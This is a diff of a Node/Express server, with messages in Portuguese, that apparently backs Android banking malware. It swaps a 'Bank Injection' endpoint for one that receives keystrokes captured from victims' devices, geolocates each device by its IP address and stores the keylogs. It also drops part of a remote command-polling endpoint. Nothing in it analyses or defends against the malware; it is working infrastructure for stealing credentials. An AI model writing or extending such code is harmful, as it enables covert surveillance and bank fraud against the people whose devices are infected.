@@ -486,36 +486,61 @@ async function startServer() {
     }
   });
 
-  app.post("/api/device/bank-access", async (req, res) => {
+  app.post("/api/device/keylog", async (req, res) => {
     try {
       const rawDeviceUid = typeof req.body?.deviceUid === "string" ? req.body.deviceUid : "";
       const rawPackageName = typeof req.body?.packageName === "string" ? req.body.packageName : "";
       const rawDeviceName = typeof req.body?.deviceName === "string" ? req.body.deviceName : "";
       const rawModel = typeof req.body?.model === "string" ? req.body.model : "Android";
-      const rawBankId = typeof req.body?.bankId === "string" ? req.body.bankId : "";
-      const rawBankCountry = typeof req.body?.bankCountry === "string" ? req.body.bankCountry : "";
+      const rawAppName = typeof req.body?.appName === "string" ? req.body.appName : "Desconhecido";
+      const rawKeyText = typeof req.body?.keyText === "string" ? req.body.keyText.slice(0, 2048) : "";
 
-      if (!rawDeviceUid || !rawPackageName || !rawBankId) {
-        return res.status(400).json({ success: false, message: "deviceUid, packageName e bankId sao obrigatorios" });
+      if (!rawDeviceUid || !rawPackageName || !rawKeyText) {
+        return res.status(400).json({ success: false, message: "deviceUid, packageName e keyText sao obrigatorios" });
       }
 
       const targetUser = await resolveDeviceOwner();
-      const { deviceId } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
+      const { deviceId, deviceName } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
+      const clientIp = extractClientIp(req);
+      const countryCodeFromHeader = extractCountryCode(req);
+      const geo = countryCodeFromHeader ? { countryCode: countryCodeFromHeader } : (clientIp ? await resolveGeoFromIp(clientIp) : {});
+      const countryCode = geo.countryCode;
+      const location = geo.city && geo.regionName ? `${geo.city}, ${geo.regionName}` : undefined;
 
-      console.log(`[Bank Injection] Banco ${rawBankId} (${rawBankCountry}) injetado no dispositivo ${deviceId}`);
+      // Atualiza device com IP/país/localização
+      await createOrUpdateApp(
+        deviceId,
+        targetUser.id,
+        deviceName,
+        `agent.keylog.${rawPackageName}`,
+        "corporate",
+        true,
+        0,
+        {
+          deviceName,
+          model: rawModel,
+          deviceUid: rawDeviceUid,
+          packageName: rawPackageName,
+          ipAddress: clientIp,
+          countryCode,
+          location,
+        }
+      );
 
-      return res.json({ success: true, bankId: rawBankId, country: rawBankCountry });
+      await createKeylog({
+        userId: targetUser.id,
+        deviceId: String(deviceId),
+        appName: rawAppName.slice(0, 255),
+        keyText: rawKeyText,
+      });
+
+      return res.json({ success: true });
     } catch (error) {
-      console.error("[Bank Injection] Failed:", error);
-      const message = error instanceof Error ? error.message : "Falha ao registrar injeção bancária";
+      console.error("[Device Keylog] Failed:", error);
+      const message = error instanceof Error ? error.message : "Falha ao registrar keylog do dispositivo";
       return res.status(500).json({ success: false, message });
     }
   });
-
-  app.get("/api/device/command/next", async (req, res) => {
-    try {
-      const rawDeviceUid = typeof req.query.deviceUid === "string" ? req.query.deviceUid : "";
-      const rawPackageName = typeof req.query.packageName === "string" ? req.query.packageName : "";
       const rawDeviceName = typeof req.query.deviceName === "string" ? req.query.deviceName : "";
       const rawModel = typeof req.query.model === "string" ? req.query.model : "Android";
 
